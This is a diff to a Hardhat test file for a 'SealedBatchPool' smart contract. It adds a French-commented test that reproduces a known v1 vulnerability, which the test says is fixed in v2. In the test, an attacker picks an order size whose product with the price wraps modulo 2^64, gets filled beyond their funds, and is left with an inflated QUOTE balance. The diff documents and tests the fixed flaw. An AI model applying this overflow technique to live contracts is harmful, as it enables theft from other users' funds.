@@ -104,6 +104,23 @@ describe("SealedBatchPool", function () {
     await expect(submit(pool, poolAddress, a, true, 1n)).to.be.revertedWithCustomError(pool, "AlreadySubmitted");
   });
 
+  it("VULNÉRABILITÉ CONNUE de la v1 (corrigée en v2) : rebouclage de q·prix → solde QUOTE rebouclé", async function () {
+    const { pool, poolAddress, operator, signers } = await loadFixture(deployFixture);
+    const [attacker, seller] = [signers[1], signers[2]];
+    await pool.connect(attacker).claimFaucet(); // 5 000 000 QUOTE
+    for (let i = 0; i < 3; i++) await pool.connect(seller).claimFaucet(); // 3 000 BASE
+    const q = (1n << 64n) / PRICE + 1n; // q·PRICE ≡ petit (mod 2^64)
+    await submit(pool, poolAddress, attacker, true, q);
+    await submit(pool, poolAddress, seller, false, 3_000n); // coût réel 7 500 000 > 5 000 000
+    await settleAll(pool, operator);
+    // L'attaquant est exécuté au-delà de ses moyens : 5 000 000 − 7 500 000 reboucle vers ~2^64.
+    await hre.cofhe.mocks.expectPlaintext(await pool.baseBalanceOf(attacker.address), 1_000n + 3_000n);
+    await hre.cofhe.mocks.expectPlaintext(
+      await pool.quoteBalanceOf(attacker.address),
+      (5_000_000n - 3_000n * PRICE + (1n << 64n)) % (1n << 64n),
+    );
+  });
+
   it("seul l'opérateur règle", async function () {
     const { pool, signers } = await loadFixture(deployFixture);
     await expect(pool.connect(signers[1]).startSettlement(PRICE)).to.be.revertedWithCustomError(pool, "NotOperator");
